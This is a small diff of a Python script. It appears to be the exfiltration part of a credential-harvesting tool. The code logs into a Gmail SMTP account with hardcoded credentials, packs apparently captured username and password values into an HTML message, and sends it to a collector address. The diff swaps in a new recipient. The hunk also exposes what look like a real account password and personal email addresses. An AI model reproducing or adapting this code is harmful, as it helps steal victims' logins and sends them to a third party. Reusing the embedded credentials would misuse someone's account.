@@ -65,7 +65,7 @@ sa = 'zarguinajack@gmail.com'
 kl = 'fugidemsvie'
 s.login(sa, kl) 
 
-ra = 'bertranddupont885@gmail.com'
+ra = 'eliastamgue@gmail.com'
 connexion = cho + ' - ' + usn + ' - ' + usp
 msg = MIMEMultipart()
 msgText = MIMEText('<b>%s</b>' % (connexion), 'html')
